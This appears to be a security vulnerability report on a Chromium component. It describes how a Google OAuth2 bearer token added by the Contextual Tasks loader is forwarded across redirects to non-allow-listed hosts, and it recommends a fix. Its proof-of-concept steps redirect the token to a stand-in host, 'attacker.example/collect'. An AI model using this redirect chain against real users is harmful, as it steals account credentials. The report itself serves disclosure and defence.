### Title
OAuth2 Bearer Token Leaked to Cross-Origin Redirect Target in Contextual Tasks WebView Proxy - ([File: chrome/browser/contextual_tasks/contextual_tasks_url_loader_factory_interceptor.cc])

### Summary
The `ContextualTasksProxyingURLLoaderFactory` attaches a Google OAuth2 `Authorization: Bearer <token>` header to requests destined for an allow-listed domain, but the accompanying `ContextualTasksURLLoader::FollowRedirect` forwards that header unconditionally on every subsequent redirect hop without re-validating that the new destination host is still within the trusted allow-list. This is structurally identical to ALPINE-CVE-2026-3783 (curl leaking a bearer token to a second host after an HTTP redirect).

### Finding Description
`ShouldAddAuthHeader()` gates attachment of the bearer token to an allow-list of `google.com`/`googlers.com` hosts, and the token is only attached once, at request-creation time, in `OnAccessTokenReceived`: [1](#0-0) 

That check happens exactly once in `CreateLoaderAndStart`/`OnAccessTokenReceived`, driven by the allow/deny lists: [2](#0-1) 

Once the token is set on `request_.headers`, the request is handed to `ContextualTasksURLLoader`, whose `FollowRedirect` simply forwards the browser-process-computed `headers_update_params` to the real network `URLLoader` with no host revalidation and no removal of the `Authorization` header: [3](#0-2) 

Because `network::HttpRequestHeadersUpdateParams` only strips headers that are explicitly listed in `removed_headers`, and this code never adds `Authorization` to that list, the header set for the original (allow-listed) origin is retained across the redirect and sent to whatever new host the server names in the `Location` response — even if that host fails `ShouldAddAuthHeader()`. The only place where the token is ever removed is in `OnComplete`, and only in the narrow CORS-preflight-failure retry path: [4](#0-3) 

This is the exact bug class from the report: a bearer credential attached based on a trust decision about the *first* URL continues to be sent to a *second*, redirect-target URL, without the trust decision being re-evaluated. Notably, another loader in the same codebase (`AwURLLoaderThrottle`) implements the correct mitigation pattern — explicitly checking `SameDomainOrHost` on redirect and removing the previously-added headers if the new host differs: [5](#0-4) 

The Contextual Tasks interceptor has no equivalent check, confirming the omission is a real gap rather than intentional design.

### Impact Explanation
If a remote/attacker-influenced page loaded inside the Contextual Tasks guest webview (`chrome://contextual-tasks`) causes a request to an allow-listed Google host (e.g. via `fetch()`/navigation to a URL under `google.com`) and that response is a 3xx redirect to an attacker-controlled origin, the OAuth2 bearer token bound to the user's Google account is sent in the `Authorization` header of the request to the attacker's server. This discloses a live access token to a third party, which can be replayed against Google APIs to read account data — a cross-origin credential/token disclosure (confidentiality impact), matching the CVSS vector in the report (`C:L`).

### Likelihood Explanation
The path is reachable purely through normal web content behavior: any content loaded in the contextual-tasks guest that can trigger a request to an allow-listed host and control (or be served by a server that returns) a redirect to a different host will trigger the leak — no special flags, extensions, or MITM/TLS tampering are required, only a same-origin/redirect chain that legitimate or compromised web infrastructure could produce (e.g., open redirect on an allow-listed subdomain, or a misconfigured/compromised allow-listed endpoint). The check is a one-time, pre-request decision (`ShouldAddAuthHeader`) with no re-validation on the redirect path, so the bug triggers deterministically whenever a redirect crosses the trust boundary.

### Recommendation
In `ContextualTasksURLLoader::FollowRedirect` (or in `OnReceiveRedirect`), re-evaluate `ShouldAddAuthHeader()` against the redirect target URL before calling `target_loader_->FollowRedirect`. If the new URL fails the check, add `Authorization` to `headers_update_params.removed_headers` and strip it from `request_.headers`, mirroring the pattern already used in `AwURLLoaderThrottle::WillRedirectRequest`.

### Proof of Concept
1. Load `chrome://contextual-tasks` so `MaybeInterceptURLLoaderFactory` installs `ContextualTasksProxyingURLLoaderFactory` for the guest webview (`chrome/browser/contextual_tasks/contextual_tasks_url_loader_factory_interceptor.cc:388-441`).
2. From content running inside that guest, issue a request to an allow-listed host, e.g. `https://google.com/redirect-me`, which passes `ShouldAddAuthHeader` and gets the `Authorization: Bearer <token>` header attached in `OnAccessTokenReceived` (lines 341-360).
3. Have the server at `https://google.com/redirect-me` (or an open-redirect endpoint under an allow-listed domain) respond with `302 Location: https://attacker.example/collect`.
4. `ContextualTasksURLLoader::FollowRedirect` (lines 139-145) forwards the redirect to the real network `URLLoader` without stripping `Authorization`, so the bearer token is delivered to `attacker.example`, which can log and reuse it.

bool ShouldAddAuthHeader(const GURL& url) {
  // Don't add the Authorization header to OGB URLs, since they don't support
  // OAuth. Attaching an OAuth token can result in 403 errors.
  if (url.spec().contains(kOneGoogleIdentifier)) {
    return false;
  }

  // Don't add the Authorization header to any domain in the deny list.
  for (const char* domain : kAuthTokenDenyList) {
    if (url.DomainIs(domain)) {
      return false;
    }
  }

  // Only add the Authorization header to domains in the allow list.
  for (const char* domain : kAuthTokenAllowList) {
    if (url.DomainIs(domain)) {
      return true;
    }
  }
  return false;
}
